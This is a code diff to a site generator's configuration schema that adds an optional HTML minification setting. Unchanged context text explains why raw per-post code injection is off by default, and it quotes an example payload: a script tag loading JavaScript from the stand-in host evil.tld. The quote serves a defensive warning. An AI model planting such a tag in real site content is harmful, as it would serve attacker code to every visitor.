@@ -209,6 +209,12 @@ export const configSchema = z
           .describe(
             "Allow per-post `codeinjection_head` / `codeinjection_foot` frontmatter to inject raw HTML via `{{ghost_head}}` / `{{ghost_foot}}`. Disabled by default because a single PR adding `codeinjection_foot: '<script src=//evil.tld/x.js></script>'` would ship site-wide JS once merged. Set to `true` only if you trust every contributor with write access to `content/` to add arbitrary HTML or JS.",
           ),
+        minify_html: z
+          .boolean()
+          .default(false)
+          .describe(
+            'Run rendered HTML through `html-minifier-terser` before writing it to disk. Collapses whitespace and strips comments to trim payload size for production deploys. Disabled by default because the minifier adds a small build-time cost and most local dev iterations do not need it. Requires the optional `html-minifier-terser` dependency; when missing, the build logs a warning once and emits unminified HTML instead of failing.',
+          ),
       })
       .strict()
       .default({})
